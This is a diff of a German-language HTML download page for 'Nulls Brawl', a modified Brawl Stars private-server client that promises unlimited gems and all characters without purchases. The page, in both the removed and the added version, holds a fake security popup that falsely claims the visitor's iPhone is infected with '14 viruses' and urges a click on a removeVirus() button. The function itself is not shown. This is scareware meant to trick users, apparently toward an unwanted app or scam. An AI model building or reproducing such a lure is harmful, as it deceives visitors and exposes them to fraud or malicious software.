@@ -2,28 +2,69 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8">
-  <title>Nulls Brawl iOS Download</title>
+  <title>Nulls Brawl v61.249</title>
   <style>
     body {
-      font-family: sans-serif;
-      text-align: center;
-      background-color: #f2f2f2;
       margin: 0;
-      padding: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #0e0e2c, #1e1e1e);
+      color: white;
     }
 
-    .main {
-      margin-top: 100px;
+    .container {
+      max-width: 600px;
+      margin: auto;
+      padding: 20px;
     }
 
-    .download-btn {
-      padding: 15px 30px;
-      background-color: #007aff;
+    .header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .icon {
+      width: 70px;
+      height: 70px;
+      border-radius: 15px;
+      margin-right: 15px;
+    }
+
+    .title {
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .version-info {
+      margin: 10px 0;
+      font-size: 16px;
+    }
+
+    .stars {
+      color: #ffcc00;
+      font-size: 20px;
+    }
+
+    .btns {
+      display: flex;
+      gap: 15px;
+      margin: 20px 0;
+    }
+
+    .btn {
+      flex: 1;
+      padding: 12px;
+      background: #8000ff;
       color: white;
       border: none;
       border-radius: 10px;
-      font-size: 18px;
+      font-size: 16px;
       cursor: pointer;
+    }
+
+    .text {
+      font-size: 15px;
+      color: #ddd;
     }
 
     .popup-overlay {
@@ -34,11 +75,12 @@
       background: rgba(0,0,0,0.6);
       justify-content: center;
       align-items: center;
-      z-index: 10;
+      z-index: 999;
     }
 
     .popup {
       background: white;
+      color: black;
       padding: 25px;
       width: 90%;
       max-width: 400px;
@@ -54,15 +96,10 @@
 
     .popup p {
       font-size: 16px;
-      margin-bottom: 15px;
-    }
-
-    .popup-warning {
-      color: orange;
-      margin: 10px 0;
     }
 
     .popup-btn {
+      margin-top: 20px;
       padding: 10px 20px;
       background-color: #007aff;
       color: white;
@@ -75,18 +112,34 @@
 </head>
 <body>
 
-<div class="main">
-  <h1>Nulls Brawl für iOS</h1>
-  <button class="download-btn" onclick="showPopup()">Download</button>
+<div class="container">
+  <div class="header">
+    <img src="https://img.icons8.com/fluency/96/null-brawler.png" class="icon" alt="App Icon">
+    <div>
+      <div class="title">Nulls Brawl</div>
+      <div class="version-info">v61.249 — Größe 628 MB</div>
+    </div>
+  </div>
+
+  <div class="stars">★★★★★</div>
+
+  <div class="btns">
+    <button class="btn">Download</button>
+    <button class="btn" onclick="showPopup()">Für iOS</button>
+  </div>
+
+  <div class="text">
+    <p><b>Nulls Brawl</b> ist eine modifizierte Version von Brawl Stars, die dir ein verbessertes Erlebnis auf einem privaten Server bietet. Du erhältst unbegrenzt Edelsteine, Münzen und Zugang zu allen Charakteren & Skins von Anfang an – ohne In-Game-Käufe.</p>
+    <p>Du kannst mit Freunden spielen, Clubs beitreten und verschiedene Spielmodi ohne Werbung zocken. Alles wie im Originalspiel – nur besser.</p>
+  </div>
 </div>
 
 <div class="popup-overlay" id="popup">
   <div class="popup" id="popupContent">
     <h2>⚠️ Sicherheitswarnung</h2>
-    <p>Ihr iPhone wurde mit <b>14 Viren</b> infiziert, nachdem Sie eine Website für Erwachsene besucht haben.</p>
-    <p>Klicken Sie auf die Schaltfläche unten, um die Viren mithilfe der Antivirus-App zu entfernen.</p>
-    <div class="popup-warning">⚠️ Entfernen Sie die Viren, um erhebliche Probleme beim Betrieb und Datenverlust zu vermeiden.</div>
-    <button class="popup-btn" onclick="removeVirus()">Entfernen Sie alle Viren</button>
+    <p>Ihr iPhone wurde mit <b>14 Viren</b> infiziert.</p>
+    <p>Klicken Sie unten, um die Viren zu entfernen.</p>
+    <button class="popup-btn" onclick="removeVirus()">Entfernen</button>
   </div>
 </div>
 
